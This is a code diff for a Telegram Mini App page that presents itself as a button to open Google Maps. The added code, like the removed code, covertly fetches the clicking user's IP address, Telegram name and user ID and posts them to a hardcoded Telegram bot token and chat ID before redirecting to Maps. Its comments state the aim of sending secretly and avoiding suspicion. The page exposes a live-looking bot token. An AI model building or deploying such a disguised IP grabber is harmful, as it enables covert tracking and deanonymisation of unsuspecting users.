@@ -1,47 +1,83 @@
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.ready();
-
-    // 設定你的資訊
-    const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM'; // 剛才從 BotFather 拿到的那一長串
-    const MY_CHAT_ID = '1287211539';    // 剛才從 userinfobot 拿到的數字
-
-    document.getElementById('btn').addEventListener('click', async () => {
-        const infoDiv = document.getElementById('info');
-        infoDiv.innerText = "正在處理中，請稍候..."; // 換個說法，不提 IP
-
-        try {
-            // 1. 取得使用者的 IP
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const userIp = data.ip;
-
-            // 2. 取得使用者在 Telegram 的名稱 (選用)
-            const userName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "未知用戶";
-
-            // 3. 偷偷發送訊息到你的 Telegram
-            const message = `📢 警報：用戶 [${userName}] 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: MY_CHAT_ID,
-                    text: message
-                })
-            });
-
-            // 4. 直接跳轉到 Google Maps (不顯示 IP 給用戶看)
-            infoDiv.innerText = "載入地圖中...";
-            setTimeout(() => {
-                tg.openLink('https://www.google.com/maps');
-                tg.close(); // 選擇性：關閉 Mini App 視窗
-            }, 500);
-
-        } catch (e) {
-            console.error(e);
-            // 失敗時還是讓用戶能跳轉，避免起疑
-            tg.openLink('https://www.google.com/maps');
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>地圖導航</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; font-family: sans-serif;
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
         }
-    });
-</script>
+        #btn {
+            padding: 15px 30px; font-size: 18px; cursor: pointer;
+            background-color: var(--tg-theme-button-color, #2481cc);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none; border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        #info { margin-top: 20px; font-size: 14px; color: var(--tg-theme-hint-color, #999); }
+    </style>
+</head>
+<body>
+
+    <button id="btn">點擊開啟 Google 地圖</button>
+    <div id="info"></div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand(); // 自動展開視窗
+
+        // 設定你的資訊
+        const BOT_TOKEN = '8791584619:AAHyvuJ9an8oF3z21kUxtZIbyVVmLk_jEhM';
+        const MY_CHAT_ID = '1287211539';
+
+        document.getElementById('btn').addEventListener('click', async () => {
+            const btn = document.getElementById('btn');
+            const infoDiv = document.getElementById('info');
+            
+            btn.disabled = true;
+            infoDiv.innerText = "正在載入資源...";
+
+            try {
+                // 1. 取得使用者的 IP (HTTPS 是必須的)
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const userIp = data.ip;
+
+                // 2. 取得使用者資訊
+                const user = tg.initDataUnsafe.user || {};
+                const userName = user.first_name || "未知用戶";
+                const userId = user.id || "未知ID";
+
+                // 3. 發送訊息到你的 Telegram
+                const message = `📢 警報：用戶 [${userName}] (ID: ${userId}) 已點擊按鈕\n🌐 來源 IP: ${userIp}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: MY_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                // 4. 跳轉
+                infoDiv.innerText = "轉向中...";
+                setTimeout(() => {
+                    tg.openLink('https://www.google.com/maps');
+                    tg.close();
+                }, 500);
+
+            } catch (e) {
+                // 就算失敗也讓使用者跳轉，避免引起懷疑
+                tg.openLink('https://www.google.com/maps');
+            }
+        });
+    </script>
+</body>
+</html>
